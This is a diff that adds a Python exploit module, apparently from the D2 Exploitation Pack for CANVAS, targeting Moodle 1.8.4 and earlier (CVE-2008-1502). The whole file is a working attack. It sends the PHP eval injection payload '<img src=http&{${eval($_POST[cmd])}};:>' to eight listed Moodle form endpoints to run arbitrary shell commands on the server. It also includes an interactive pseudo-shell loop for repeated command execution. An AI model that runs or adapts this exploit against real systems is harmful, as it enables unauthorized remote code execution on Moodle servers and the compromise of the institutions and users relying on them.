@@ -1,0 +1,142 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, os
+
+sys.path.append(".")
+sys.path.append(os.path.join(os.getcwd(), '3rdparty/D2SEC/libs'))
+
+from exploitutils import *
+import canvasengine
+from canvasexploit import canvasexploit
+import httplib, mimetypes
+
+# GUI info
+NAME = "d2sec_moodle_rexec"
+DESCRIPTION = "Moodle <= 1.8.4 remote command execution Vulnerability" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['Vendor'] = 'Moodle'
+DOCUMENTATION["Repeatability"] = 'Infinite'
+DOCUMENTATION['Date public'] = '2008-09-13'
+DOCUMENTATION['References'] = 'http://www.securityfocus.com/bid/28599'
+DOCUMENTATION['Versions Affected'] = 'version <= 1.8.4'
+DOCUMENTATION["CERT Advisory"] = ''
+DOCUMENTATION["CVE Name"] = 'CVE-2008-1502' 
+DOCUMENTATION["CVE Url"] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1502'
+
+DOCUMENTATION["Notes"] = """
+
+Use arg shell:1 in commandline to "simulate" a comand shell. 
+
+"""
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 80
+    self.webroot = '/moodle'
+    self.cmd = ''
+    self.webhost = ''
+    self.shell = 0
+
+  def encode_multipart_formdata(self, fields):
+    boundary = '----------ThIs_Is_tHe_bouNdaRY_$'
+    crlf = '\r\n'
+    lines = []
+    for (key, value) in fields.items():
+      lines.append('--' + boundary)
+      lines.append('Content-Disposition: form-data; name="%s"' % key)
+      lines.append('')
+      lines.append(value)
+    lines.append('--' + boundary + '--')
+    lines.append('')
+    body = crlf.join(lines)
+    content_type = 'multipart/form-data; boundary=%s' % boundary
+    return content_type, body
+
+  def remote_exec_cmd(self):
+    formvulns = {
+      'blocks/rss_client/block_rss_client_error.php': 'error',
+      'course/scales.php?id=1': 'name',
+      'help.php': 'text',
+      'login/confirm.php': 'data',
+      'mod/chat/gui_basic/index.php?id=1': 'message',
+      'mod/forum/post.php': 'name',
+      'mod/glossary/approve.php?id=1': 'hook',
+      'mod/wiki/admin.php': 'page',
+    }
+
+    for url, msg in formvulns.items():
+      params = {
+        msg: '<img src=http&{${eval($_POST[cmd])}};:>',
+        'cmd': self.cmd,
+      }
+      content_type, body = self.encode_multipart_formdata(params)
+      conn = httplib.HTTP('%s:%d' % (self.host, self.port))
+      conn.putrequest('POST', '%s/%s' % (self.webroot, url))
+      conn.putheader('Host', '%s' % self.webhost)
+      conn.putheader('Accept', '*/*')
+      conn.putheader('content-type', content_type)
+      conn.putheader('content-length', str(len(body)))
+      conn.putheader('expect', '100-continue')
+      conn.endheaders()
+      conn.send(body)
+      errcode, errmsg, headers = conn.getreply()
+      if errcode == 200:
+        self.log('%s' % conn.file.read())
+        break
+    conn.close()
+
+  def remote_shell(self):
+    while 1:
+      strs = raw_input('moodle $> ')
+      if strs == 'quit':
+        break
+      self.cmd = 'echo `%s`;exit;' % strs
+      self.remote_exec_cmd()
+
+  def run(self):
+    self.host = self.target.interface	
+    self.webhost = self.argsDict.get('hostname', self.webhost)
+    if not self.webhost:
+      self.webhost = self.host
+    self.port = int(self.argsDict.get('port', self.port))
+    self.webroot = self.argsDict.get('webroot', self.webroot)
+    self.cmd = self.argsDict.get('cmd', self.cmd)
+    self.cmd = 'echo `%s`;exit;' % self.cmd
+    self.shell = int(self.argsDict.get('shell', self.shell))
+
+    ret = self.test()
+    self.setInfo('[D2] %s attacking %s - running'%(NAME,self.host))
+    if self.shell:
+      self.remote_shell()
+    else:      
+      self.remote_exec_cmd()
+    self.setInfo('[D2] %s attacking %s - done' % (NAME,self.host))
+    return 1
+
+  def usage(self):
+  	print 'Usage: %s -t host [-p port:80] -O webhost:<url> -O cmd:<command> -O shell:<0|1>' % sys.argv[0]
+  	return
+
+if __name__ == '__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
